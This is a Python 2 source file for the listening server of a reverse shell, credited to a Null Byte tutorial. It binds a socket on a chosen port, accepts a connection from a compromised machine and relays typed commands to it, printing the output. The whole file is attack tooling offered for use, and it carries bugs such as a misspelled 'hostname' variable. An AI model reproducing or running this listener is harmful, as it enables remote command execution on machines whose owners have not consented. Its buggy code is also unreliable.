# nullbyte python server reverse shell
# source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
import socket, os, sys
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = raw_input('type the port for listening: ')
        if port == '':
            socketCreate()
        port = int(port)
    except socket.error as msg:
        print('socket creation error: ' + str(msg[0]))
def socketBind():
    try:
        print('Binding socket at port %s'%(port))
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print('socket bindig error: ' + str(msg[0]))
        print('Retring...')
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
        print('\n')
        hsotname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print('Socket Accepting error: ' + str(msg[0]))
def menu():
    while 1:
        cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result <> hostname:
            print(result)
def main():
    socketCreate()
    socketBind()
    socketAccept()
    
main()